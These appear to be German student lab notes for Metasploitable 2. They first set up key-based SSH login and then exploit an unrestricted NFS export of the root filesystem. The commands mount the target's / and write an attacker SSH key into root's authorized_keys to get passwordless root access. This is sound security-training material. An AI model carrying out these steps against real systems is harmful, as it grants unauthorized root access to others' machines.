## Übung (ssh auf Metasploitable)
Als Vorbereitung für die folgende Übung.

Konfiguriere passwortloses ssh Login auf Metasploitable mit Hilfe eines ssh Public/Private keys.

Betrachte besonders die notwendigen Änderungen in ~/.ssh/authorized_keys, diese Datei muss in der nachfolgenden Übung manipuliert werden.

- Hinweis: der ssh-server auf Metasploitable unterstützt nur Schlüssel im RSA Format (nicht die neueren default Formate wie ed255…).
    - Der Kali ssh Client lehnt die Verbindung mit diesem alten Schlüssel standardmäßig ab, aber man kann es mit Optionen wieder erzwingen.
    - Bei ssh Verbindungsproblemen hilft häufig die Verwendung der Verbose Optionen des ssh clients (-v, -vv oder -vvv).

Mit `ssh-keygen -t rsa -b 2048 -f ~/.ssh/metasploitable_rsa` ein Schlüsselpaar generieren und in der datei metasploitable_rsa (es gibt einmal eins mit .pub mit Public Key und das ohne ist halt der Private Key).

Wenn man sich mit 

```sh
└─$ ssh msfadmin@192.168.8.130                            
Unable to negotiate with 192.168.8.130 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
```
geht es am Anfang erst nicht, weil er die veralteten SSH-Server benutzt.

Mit diesem Befehl erzwingt man das man sich damit anmeldet:
```sh
ssh -o HostKeyAlgorithms=+ssh-rsa \
-o PubkeyAcceptedAlgorithms=+ssh-rsa \
msfadmin@192.168.8.130
```

Einen Ordner erstellen für die keys:

```
mkdir -p ~/.ssh
chmod 700 ~/.ssh
```

Mit `cat ~/.ssh/metasploitable_rsa.pub` im Kali den Public Key anzeigen lassen.

Danach export TERM=xterm benutzen, weil der alte SSH-Server von Metasploitable den Terminaltyp xterm-256color nicht kennt.

Und den Public Key vom Kali dann in `~/.ssh/authorized_keys` einfügen.

Mit `chmod 600 ~/.ssh/authorized_keys` Rechte vergeben.

Mit dem Befehl:

```sh
ssh -vvv -i ~/.ssh/metasploitable_rsa \
-o HostKeyAlgorithms=+ssh-rsa \
-o PubkeyAcceptedAlgorithms=+ssh-rsa \
msfadmin@192.168.8.130
```

sich anmelden und es funktioniert.

## Übung (portmapper/nfs)
Metasploitable 2 enthält eine Schwachstelle im Zusammenhang mit portmapper/nfs.

Informiere dich grob über nfs (network file system) und den Zusammenhang mit portmapper
Was kannst du über nmap und nmap scripts über die nfs Schwachstelle herausfinden?
Nutze die Schwachstelle aus indem du über das File-System einen ssh key in das Homeverzeichnis von root hineinschwindelst. Das Ziel ist, dass vom Angreifer-System aus ein passwortloses SSH login auf root@metasploitable möglich ist.


## NFS
NFS (Network File System) ist ein Netzwerkprotokoll, mit dem ein Rechner Verzeichnisse über das Netzwerk freigeben kann.
Ein Client kann ein entferntes Verzeichnis so einbinden, als wäre es lokal.

Typischer NFS-Port:
2049/TCP

NFS basiert auf RPC (Remote Procedure Call).

Damit ein Client weiß, auf welchem Port NFS läuft, fragt er zuerst:
Portmapper (rpcbind) auf Port 111

Der Portmapper sagt dann:
„Der NFS-Dienst läuft auf Port 2049.“

Ohne Portmapper könnte der Client den Dienst nicht finden.


Man kann mit `nmap -sS -sV 192.168.8.130` nach offene Ports suchen. (Generell)

Was man findet ist das man mit * -> JEDER darf mounten und es gibt keine IP-Beschränkungen und es wird exportiert.

Wenn / exportiert ist, kann ein Angreifer:
- Das komplette Root-Filesystem mounten
- Systemdateien verändern
- Benutzerverzeichnisse manipulieren
- SSH Keys hinzufügen

Mit `showmount -e 192.168.8.130` kann man pürfen ob man es für einen Angriff benutzten kann.

```sh
└─$ showmount -e 192.168.8.130
Export list for 192.168.8.130:
/ *
```

Mountpoint erstellen mit `mkdir /tmp/meta` auf Kali.

Mit dem Befehl

```
└─$ sudo mount -t nfs 192.168.8.130:/ /tmp/meta
[sudo] password for kali: 
Created symlink '/run/systemd/system/remote-fs.target.wants/rpc-statd.service' → '/usr/lib/systemd/system/rpc-statd.service'.                                                                                                                            
```
kann man Root-Dateisystem mounten.

Mit `ssh-keygen -t rsa -b 2048 -f ~/.ssh/meta_root`  neuen ssh key Paar erstellen.

Dann mit `sudo mkdir -p /tmp/meta/root/.ssh` SSH Ordner für root erstellen.

Public Key einfügen mit `sudo cp ~/.ssh/meta_root.pub /tmp/meta/root/.ssh/authorized_keys`.

Mit `sudo chmod 700 /tmp/meta/root/.ssh` und `sudo chmod 600 /tmp/meta/root/.ssh/authorized_keys` Rechte vergeben.

Mit `sudo umount /tmp/meta` unmouten.

Und mit dem Befehl:

``` sh
ssh -i ~/.ssh/meta_root \
-o HostKeyAlgorithms=+ssh-rsa \
-o PubkeyAcceptedAlgorithms=+ssh-rsa \
root@192.168.8.130
```
